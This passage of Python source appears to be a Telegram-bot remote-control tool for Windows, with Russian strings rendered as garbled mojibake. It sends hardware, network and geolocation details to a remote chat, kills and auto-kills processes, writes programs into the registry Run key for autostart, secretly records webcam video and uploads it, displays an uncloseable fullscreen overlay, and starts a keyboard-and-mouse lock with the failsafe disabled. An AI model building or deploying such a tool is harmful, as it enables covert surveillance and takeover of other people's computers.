                    pythoncom.CoInitializeEx(pythoncom.COINIT_MULTITHREADED)
                    wmi_obj = wmi.WMI()
                    temp_info = wmi_obj.MSAcpi_ThermalZoneTemperature()
                    cpu_temp = temp_info[0].CurrentTemperature / 10 - 273.15 if temp_info else "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å"
                except Exception as wmi_error:
                    handle_error(wmi_error, "–ø–æ–ª—É—á–µ–Ω–∏–∏ —Ç–µ–º–ø–µ—Ä–∞—Ç—É—Ä—ã CPU")
                finally:
                    try:
                        pythoncom.CoUninitialize()
                    except pythoncom.com_error:
                        pass

                # –û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å
                ram = psutil.virtual_memory()
                ram_total = round(ram.total / (1024**3), 2)
                ram_used = round(ram.used / (1024**3), 2)

                # –î–∏—Å–∫–∏
                disk_info = psutil.disk_partitions()
                disks = []
                for partition in disk_info:
                    try:
                        usage = psutil.disk_usage(partition.mountpoint)
                        disks.append(
                            f"{partition.device} - {round(usage.total / (1024**3), 2)} GB "
                            f"(—Å–≤–æ–±–æ–¥–Ω–æ: {round(usage.free / (1024**3), 2)} GB)"
                        )
                    except:
                        continue

                # –í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞ (–∏—Å–ø–æ–ª—å–∑—É–µ–º wmi)
                gpu_name = "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å"
                gpu_resolution = "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å"
                try:
                    pythoncom.CoInitializeEx(pythoncom.COINIT_MULTITHREADED)
                    wmi_obj = wmi.WMI()
                    gpu_info = wmi_obj.Win32_VideoController()[0]
                    gpu_name = gpu_info.Name
                    gpu_resolution = f"{gpu_info.CurrentHorizontalResolution}x{gpu_info.CurrentVerticalResolution}"
                except Exception as wmi_error:
                    handle_error(wmi_error, "–ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö –æ –≤–∏–¥–µ–æ–∫–∞—Ä—Ç–µ")
                finally:
                    try:
                        pythoncom.CoUninitialize()
                    except pythoncom.com_error:
                        pass

                # –ú–∞—Ç–µ—Ä–∏–Ω—Å–∫–∞—è –ø–ª–∞—Ç–∞ (–∏—Å–ø–æ–ª—å–∑—É–µ–º wmi)
                motherboard_info = "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å"
                try:
                    pythoncom.CoInitializeEx(pythoncom.COINIT_MULTITHREADED)
                    wmi_obj = wmi.WMI()
                    mb_info = wmi_obj.Win32_BaseBoard()[0]
                    motherboard_info = f"{mb_info.Manufacturer} {mb_info.Product}"
                except Exception as wmi_error:
                    handle_error(wmi_error, "–ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö –æ –º–∞—Ç–µ—Ä–∏–Ω—Å–∫–æ–π –ø–ª–∞—Ç–µ")
                finally:
                    try:
                        pythoncom.CoUninitialize()
                    except pythoncom.com_error:
                        pass

                # –°–µ—Ç–µ–≤—ã–µ –∞–¥–∞–ø—Ç–µ—Ä—ã
                network_info = psutil.net_if_addrs()
                network_stats = psutil.net_if_stats()
                network_details = []
                for iface, addrs in network_info.items():
                    if iface in network_stats and network_stats[iface].isup:
                        for addr in addrs:
                            if addr.family == 2:  # IPv4
                                network_details.append(f"–ê–¥–∞–ø—Ç–µ—Ä: {iface}\nIP: {addr.address}\n")

                # USB-—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ (–∏—Å–ø–æ–ª—å–∑—É–µ–º wmi)
                usb_devices = []
                try:
                    pythoncom.CoInitializeEx(pythoncom.COINIT_MULTITHREADED)
                    wmi_obj = wmi.WMI()
                    usb_devices_raw = wmi_obj.Win32_PnPEntity()
                    usb_devices = [device.Caption for device in usb_devices_raw if device.Caption and 'USB' in device.Caption]
                except Exception as wmi_error:
                    handle_error(wmi_error, "–ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö –æ–± USB-—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö")
                finally:
                    try:
                        pythoncom.CoUninitialize()
                    except pythoncom.com_error:
                        pass

                # IP-–∞–¥—Ä–µ—Å –∏ –ø—Ä–æ–≤–∞–π–¥–µ—Ä
                ip_info = requests.get("http://ipinfo.io/json").json()
                ip = ip_info.get("ip", "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å")
                provider = ip_info.get("org", "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å")
                city = ip_info.get("city", "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å")
                region = ip_info.get("region", "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å")

                # –§–æ—Ä–º–∏—Ä—É–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                info = (
                    f"üñ• **–°–∏—Å—Ç–µ–º–∞**:\n"
                    f"OS: {os_name} {os_version} ({os_architecture})\n"
                    f"–ü–æ—Å–ª–µ–¥–Ω—è—è –∑–∞–≥—Ä—É–∑–∫–∞: {boot_time}\n\n"
                    f"üíª **–ê–ø–ø–∞—Ä–∞—Ç–Ω–æ–µ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ**:\n"
                    f"CPU: {cpu_name}\n"
                    f"–ß–∞—Å—Ç–æ—Ç–∞: {cpu_freq} MHz\n"
                    f"–Ø–¥–µ—Ä: {cpu_cores}\n"
                    f"–ü–æ—Ç–æ–∫–æ–≤: {cpu_threads}\n"
                    f"–¢–µ–º–ø–µ—Ä–∞—Ç—É—Ä–∞ CPU: {cpu_temp} ¬∞C\n"
                    f"RAM: {ram_total} GB (–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: {ram_used} GB)\n"
                    f"–í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞: {gpu_name}\n"
                    f"–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: {gpu_resolution}\n"
                    f"–ú–∞—Ç–µ—Ä–∏–Ω—Å–∫–∞—è –ø–ª–∞—Ç–∞: {motherboard_info}\n\n"
                    f"üíæ **–î–∏—Å–∫–∏**:\n"
                )
                for disk in disks:
                    info += f"{disk}\n"

                info += "\nüîå **–ü–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã–µ USB-—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞**:\n"
                if usb_devices:
                    for device in usb_devices:
                        info += f"- {device}\n"
                else:
                    info += "–ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö USB-—É—Å—Ç—Ä–æ–π—Å—Ç–≤.\n"

                info += "\nüåê **–°–µ—Ç—å**:\n"
                info += f"IP: {ip}\n"
                info += f"–ü—Ä–æ–≤–∞–π–¥–µ—Ä: {provider}\n"
                info += f"–ì–æ—Ä–æ–¥: {city}\n"
                info += f"–†–µ–≥–∏–æ–Ω: {region}\n"
                for net in network_details:
                    info += net

                bot.send_message(message.chat.id, info)
            except Exception as e:
                handle_error(e, "—Å–±–æ—Ä–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ")
            finally:
                global sysinfo_running
                sysinfo_running = False

        # –ó–∞–ø—É—Å–∫ —Å–±–æ—Ä–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
        threading.Thread(target=collect_system_info, daemon=True).start()
    except Exception as e:
        handle_error(e, "–∑–∞–ø—É—Å–∫–µ —Å–±–æ—Ä–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ")
        sysinfo_running = False

# –ü—Ä–æ—Ü–µ—Å—Å—ã
@bot.message_handler(func=lambda message: message.text == "üì∫ –ü—Ä–æ—Ü–µ—Å—Å—ã")
def processes_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("üë§ –ó–∞–ø—É—â–µ–Ω–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã", callback_data="proc_type:user:0"))
        markup.add(types.InlineKeyboardButton("üïí –§–æ–Ω–æ–≤—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã", callback_data="proc_type:background:0"))
        markup.add(types.InlineKeyboardButton("ü™ü –ü—Ä–æ—Ü–µ—Å—Å—ã Windows", callback_data="proc_type:windows:0"))
        markup.add(types.InlineKeyboardButton("üö´ –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ", callback_data="proc_type:blocked:0"))
        markup.add(types.InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="back:main"))
        bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø –ø—Ä–æ—Ü–µ—Å—Å–æ–≤:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é –ø—Ä–æ—Ü–µ—Å—Å–æ–≤")

def show_processes(call, proc_type, page=0, per_page=10):
    try:
        markup = types.InlineKeyboardMarkup()
        processes = sorted(psutil.process_iter(['pid', 'name', 'create_time', 'username']), key=lambda p: p.info['create_time'], reverse=True)
        filtered = {
            "user": [p for p in processes if p.info['username'] and "SYSTEM" not in p.info['username'] and "SERVICE" not in p.info['username']],
            "background": [p for p in processes if p.info['username'] and ("SYSTEM" in p.info['username'] or "SERVICE" in p.info['username'])],
            "windows": [p for p in processes if p.info['name'].lower().startswith("svchost") or "win" in p.info['name'].lower()],
            "blocked": [p for p in processes if p.info['name'].lower() in blocked_apps]
        }.get(proc_type, [])
        
        total_pages = (len(filtered) + per_page - 1) // per_page
        start = page * per_page
        end = min(start + per_page, len(filtered))
        
        for proc in filtered[start:end]:
            markup.add(types.InlineKeyboardButton(proc.info['name'], callback_data=f"proc:{proc.info['pid']}"))
        
        nav_row = []
        if page > 0:
            nav_row.append(types.InlineKeyboardButton("‚¨ÖÔ∏è", callback_data=f"proc_type:{proc_type}:{page-1}"))
        if page < total_pages - 1:
            nav_row.append(types.InlineKeyboardButton("‚û°Ô∏è", callback_data=f"proc_type:{proc_type}:{page+1}"))
        if nav_row:
            markup.row(*nav_row)
        
        markup.add(types.InlineKeyboardButton("–ù–∞–∑–∞–¥ –≤ –º–µ–Ω—é", callback_data="back:processes"))
        bot.edit_message_text(f"–ü—Ä–æ—Ü–µ—Å—Å—ã ({proc_type}) [{page+1}/{total_pages}]:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    except Exception as e:
        handle_error(e, "–æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤")

@bot.callback_query_handler(func=lambda call: call.data.startswith("proc_type:"))
def proc_type_callback(call):
    try:
        proc_type, page = call.data.split(":", 2)[1:]
        show_processes(call, proc_type, int(page))
    except Exception as e:
        handle_error(e, "–≤—ã–±–æ—Ä–µ —Ç–∏–ø–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤")

@bot.callback_query_handler(func=lambda call: call.data.startswith("proc:"))
def proc_callback(call):
    try:
        pid = int(call.data.split(":", 1)[1])
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–ü—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å", callback_data=f"suspend:{pid}"))
        markup.add(types.InlineKeyboardButton("–û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å", callback_data=f"kill:{pid}"))
        markup.add(types.InlineKeyboardButton("–£–¥–∞–ª–∏—Ç—å", callback_data=f"delete:{pid}"))
        markup.add(types.InlineKeyboardButton("–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å", callback_data=f"block:{pid}"))
        p = psutil.Process(pid)
        if p.name().lower() in blocked_apps:
            markup.add(types.InlineKeyboardButton("–†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å", callback_data=f"unblock:{pid}"))
        markup.add(types.InlineKeyboardButton("–ù–∞–∑–∞–¥", callback_data="back:processes"))
        bot.edit_message_text(f"–ü—Ä–æ—Ü–µ—Å—Å {p.name()} (PID {pid}):", call.message.chat.id, call.message.message_id, reply_markup=markup)
    except Exception as e:
        handle_error(e, "—Ä–∞–±–æ—Ç–µ —Å –ø—Ä–æ—Ü–µ—Å—Å–æ–º")

@bot.callback_query_handler(func=lambda call: call.data.startswith("suspend:"))
def suspend_callback(call):
    try:
        pid = int(call.data.split(":", 1)[1])
        p = psutil.Process(pid)
        p.suspend()
        bot.answer_callback_query(call.id, "–ü—Ä–æ—Ü–µ—Å—Å –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
    except Exception as e:
        handle_error(e, "–ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∫–µ –ø—Ä–æ—Ü–µ—Å—Å–∞")

@bot.callback_query_handler(func=lambda call: call.data.startswith("kill:"))
def kill_callback(call):
    try:
        pid = int(call.data.split(":", 1)[1])
        p = psutil.Process(pid)
        p.kill()
        bot.answer_callback_query(call.id, "–ü—Ä–æ—Ü–µ—Å—Å –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
    except Exception as e:
        handle_error(e, "–æ—Å—Ç–∞–Ω–æ–≤–∫–µ –ø—Ä–æ—Ü–µ—Å—Å–∞")

@bot.callback_query_handler(func=lambda call: call.data.startswith("delete:"))
def delete_callback(call):
    try:
        pid = int(call.data.split(":", 1)[1])
        p = psutil.Process(pid)
        p.terminate()
        bot.answer_callback_query(call.id, "–ü—Ä–æ—Ü–µ—Å—Å —É–¥–∞–ª—ë–Ω")
    except Exception as e:
        handle_error(e, "—É–¥–∞–ª–µ–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞")

@bot.callback_query_handler(func=lambda call: call.data.startswith("block:"))
def block_callback(call):
    try:
        pid = int(call.data.split(":", 1)[1])
        p = psutil.Process(pid)
        blocked_apps.add(p.name().lower())
        bot.answer_callback_query(call.id, f"{p.name()} –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω")
    except Exception as e:
        handle_error(e, "–±–ª–æ–∫–∏—Ä–æ–≤–∫–µ –ø—Ä–æ—Ü–µ—Å—Å–∞")

@bot.callback_query_handler(func=lambda call: call.data.startswith("unblock:"))
def unblock_callback(call):
    try:
        pid = int(call.data.split(":", 1)[1])
        p = psutil.Process(pid)
        blocked_apps.discard(p.name().lower())
        bot.answer_callback_query(call.id, f"{p.name()} —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω")
    except Exception as e:
        handle_error(e, "—Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–µ –ø—Ä–æ—Ü–µ—Å—Å–∞")

def check_blocked_apps():
    try:
        while True:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in blocked_apps:
                    proc.kill()
            time.sleep(1)
    except Exception as e:
        handle_error(e, "–ø—Ä–æ–≤–µ—Ä–∫–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π")

threading.Thread(target=check_blocked_apps, daemon=True).start()

# –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞
@bot.message_handler(func=lambda message: message.text == "üîß –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞")
def startup_command(message):
    try:
        if not check_id(message):
            return
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("üìã –ü—Ä–æ—Å–º–æ—Ç—Ä", "‚ûï –î–æ–±–∞–≤–∏—Ç—å", "‚ûñ –£–¥–∞–ª–∏—Ç—å", "‚¨ÖÔ∏è –ù–∞–∑–∞–¥")
        bot.send_message(message.chat.id, "–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–æ–π:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏")

@bot.message_handler(func=lambda message: message.text == "üìã –ü—Ä–æ—Å–º–æ—Ç—Ä")
def startup_list(message):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
        items = []
        i = 0
        while True:
            try:
                name, value, _ = winreg.EnumValue(key, i)
                items.append(f"üîπ {name} ‚Üí {value}")
                i += 1
            except:
                break
        winreg.CloseKey(key)
        bot.send_message(message.chat.id, "–ü—Ä–æ–≥—Ä–∞–º–º—ã –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–µ:\n" + "\n".join(items) or "–°–ø–∏—Å–æ–∫ –ø—É—Å—Ç")
    except Exception as e:
        handle_error(e, "–ø—Ä–æ—Å–º–æ—Ç—Ä–µ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏")

@bot.message_handler(func=lambda message: message.text == "‚ûï –î–æ–±–∞–≤–∏—Ç—å")
def startup_add(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å –∏–º—è –∏ –ø—É—Ç—å (–ø—Ä–∏–º–µ—Ä: MyApp C:\\app.exe)")
        bot.register_next_step_handler(message, add_to_startup)
    except Exception as e:
        handle_error(e, "–¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É")

def add_to_startup(message):
    try:
        name, path = message.text.split(" ", 1)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
        bot.send_message(message.chat.id, f"‚úÖ {name} –¥–æ–±–∞–≤–ª–µ–Ω")
    except Exception as e:
        handle_error(e, "–¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –ø—Ä–æ–≥—Ä–∞–º–º—ã –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É")

@bot.message_handler(func=lambda message: message.text == "‚ûñ –£–¥–∞–ª–∏—Ç—å")
def startup_remove(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å –∏–º—è –ø—Ä–æ–≥—Ä–∞–º–º—ã")
        bot.register_next_step_handler(message, remove_from_startup)
    except Exception as e:
        handle_error(e, "—É–¥–∞–ª–µ–Ω–∏–∏ –∏–∑ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏")

def remove_from_startup(message):
    try:
        name = message.text
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
        bot.send_message(message.chat.id, f"‚ùå {name} —É–¥–∞–ª—ë–Ω")
    except Exception as e:
        handle_error(e, "—É–¥–∞–ª–µ–Ω–∏–∏ –ø—Ä–æ–≥—Ä–∞–º–º—ã –∏–∑ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏")

# –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è
def show_fullscreen_notification(text):
    try:
        create_overlay()
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.overrideredirect(True)
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        root.configure(bg='black')
        label = tk.Label(root, text=text, font=("Arial", 20), fg="white", bg="black", wraplength=600)
        label.pack(expand=True, pady=100)
        yes_button = tk.Button(root, text="–î–∞", command=lambda: [bot.send_message(my_id, "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª: –î–∞"), root.destroy(), destroy_overlay()], font=("Arial", 20), width=10, height=2)
        no_button = tk.Button(root, text="–ù–µ—Ç", command=lambda: [bot.send_message(my_id, "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª: –ù–µ—Ç"), root.destroy(), destroy_overlay()], font=("Arial", 20), width=10, height=2)
        yes_button.place(relx=0.35, rely=0.7, anchor="center")
        no_button.place(relx=0.65, rely=0.7, anchor="center")
        root.mainloop()
    except Exception as e:
        handle_error(e, "–æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è")
        destroy_overlay()

@bot.message_handler(func=lambda message: message.text == "üì© –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è")
def notify_command(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å —Ç–µ–∫—Å—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è")
        bot.register_next_step_handler(message, send_fullscreen_notification)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π")

def send_fullscreen_notification(message):
    try:
        threading.Thread(target=show_fullscreen_notification, args=(message.text,), daemon=True).start()
    except Exception as e:
        handle_error(e, "–æ—Ç–ø—Ä–∞–≤–∫–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è")

# –ì—Ä–æ–º–∫–æ—Å—Ç—å
@bot.message_handler(func=lambda message: message.text == "üîä –ì—Ä–æ–º–∫–æ—Å—Ç—å")
def volume_command(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–ì—Ä–æ–º—á–µ", callback_data="vol:up"))
        markup.add(types.InlineKeyboardButton("–¢–∏—à–µ", callback_data="vol:down"))
        markup.add(types.InlineKeyboardButton("–í—ã–∫–ª—é—á–∏—Ç—å", callback_data="vol:mute"))
        markup.add(types.InlineKeyboardButton("–í–≤–µ—Å—Ç–∏ —É—Ä–æ–≤–µ–Ω—å", callback_data="vol:set"))
        markup.add(types.InlineKeyboardButton("–ù–∞–∑–∞–¥", callback_data="back:main"))
        bot.send_message(message.chat.id, "–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≥—Ä–æ–º–∫–æ—Å—Ç—å—é:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é –≥—Ä–æ–º–∫–æ—Å—Ç–∏")

@bot.callback_query_handler(func=lambda call: call.data.startswith("vol:"))
def vol_callback(call):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)
        current = volume.GetMasterVolumeLevelScalar()
        if call.data == "vol:up":
            volume.SetMasterVolumeLevelScalar(min(current + 0.1, 1.0), None)
            bot.answer_callback_query(call.id, "–ì—Ä–æ–º–∫–æ—Å—Ç—å —É–≤–µ–ª–∏—á–µ–Ω–∞")
        elif call.data == "vol:down":
            volume.SetMasterVolumeLevelScalar(max(current - 0.1, 0.0), None)
            bot.answer_callback_query(call.id, "–ì—Ä–æ–º–∫–æ—Å—Ç—å —É–º–µ–Ω—å—à–µ–Ω–∞")
        elif call.data == "vol:mute":
            volume.SetMute(1, None)
            bot.answer_callback_query(call.id, "–ó–≤—É–∫ –≤—ã–∫–ª—é—á–µ–Ω")
        elif call.data == "vol:set":
            bot.send_message(call.message.chat.id, "–í–≤–µ–¥–∏ —É—Ä–æ–≤–µ–Ω—å –≥—Ä–æ–º–∫–æ—Å—Ç–∏ (0-100):")
            bot.register_next_step_handler(call.message, set_volume)
    except Exception as e:
        handle_error(e, "—É–ø—Ä–∞–≤–ª–µ–Ω–∏–∏ –≥—Ä–æ–º–∫–æ—Å—Ç—å—é")

def set_volume(message):
    try:
        level = int(message.text)
        if 0 <= level <= 100:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = interface.QueryInterface(IAudioEndpointVolume)
            volume.SetMasterVolumeLevelScalar(level / 100, None)
            bot.send_message(message.chat.id, f"–ì—Ä–æ–º–∫–æ—Å—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ {level}%")
        else:
            bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –æ—Ç 0 –¥–æ 100")
    except Exception as e:
        handle_error(e, "—É—Å—Ç–∞–Ω–æ–≤–∫–µ —É—Ä–æ–≤–Ω—è –≥—Ä–æ–º–∫–æ—Å—Ç–∏")

# –°—Ç—Ä–∏–º–∏–Ω–≥
def stream_with_audio(chat_id, duration=10):
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            bot.send_message(chat_id, "–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å –≤–µ–±-–∫–∞–º–µ—Ä—É")
            return

        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        temp_video = "temp_stream.avi"
        out = cv2.VideoWriter(temp_video, fourcc, 20.0, (640, 480))
        
        start_time = time.time()
        while time.time() - start_time < duration:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
        
        cap.release()
        out.release()
        cv2.destroyAllWindows()

        if not os.path.exists(temp_video) or os.path.getsize(temp_video) == 0:
            bot.send_message(chat_id, "–û—à–∏–±–∫–∞: –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ")
            return

        with open(temp_video, "rb") as video:
            bot.send_video(chat_id, video, supports_streaming=True)
        
        os.remove(temp_video)
    except Exception as e:
        handle_error(e, "—Å—Ç—Ä–∏–º–∏–Ω–≥–µ")

@bot.message_handler(func=lambda message: message.text == "üì° –°—Ç—Ä–∏–º–∏–Ω–≥")
def stream_command(message):
    try:
        if not check_id(message):
            return
        global streaming
        streaming = True
        threading.Thread(target=stream_with_audio, args=(message.chat.id,), daemon=True).start()
        bot.send_message(message.chat.id, "–°—Ç—Ä–∏–º–∏–Ω–≥ –Ω–∞—á–∞—Ç (10 —Å–µ–∫—É–Ω–¥).")
    except Exception as e:
        handle_error(e, "–∑–∞–ø—É—Å–∫–µ —Å—Ç—Ä–∏–º–∏–Ω–≥–∞")

# –í–µ—Å–µ–ª—å–µ
@bot.message_handler(func=lambda message: message.text == "üéâ –í–µ—Å–µ–ª—å–µ")
def fun_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("üîä –í–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫ –ø–æ —Å—Å—ã–ª–∫–µ", "üñ• –ú–æ–Ω–∏—Ç–æ—Ä", "üñ± –ò–Ω–≤–µ—Ä—Å–∏—è –º—ã—à–∏")
        markup.add("üòÇ –®—É—Ç–∫–∏", "üñº –°–º–µ–Ω–∞ –æ–±–æ–µ–≤", "üì∏ –û—Ç–∫—Ä—ã—Ç—å —Ñ–æ—Ç–æ")
        markup.add("üì¢ –°–∏—Å—Ç–µ–º–Ω–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ", "üîí –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –≤–≤–æ–¥–∞")
        markup.add("‚õî –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —à—É—Ç–∫–∏", "‚¨ÖÔ∏è –ù–∞–∑–∞–¥")
        bot.send_message(message.chat.id, "–í–µ—Å–µ–ª—å–µ:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é –≤–µ—Å–µ–ª—å—è")

@bot.message_handler(func=lambda message: message.text == "üîí –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –≤–≤–æ–¥–∞")
def toggle_input_block(message):
    try:
        if not check_id(message):
            return
        global input_blocked
        if input_blocked:
            input_blocked = False
            bot.send_message(message.chat.id, "–ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –∏ –º—ã—à–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∞.")
        else:
            if not is_admin():
                bot.send_message(message.chat.id, "–¢—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –≤–≤–æ–¥–∞.")
                return
            input_blocked = True
            pyautogui.FAILSAFE = False  # –û—Ç–∫–ª—é—á–∞–µ–º failsafe –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏
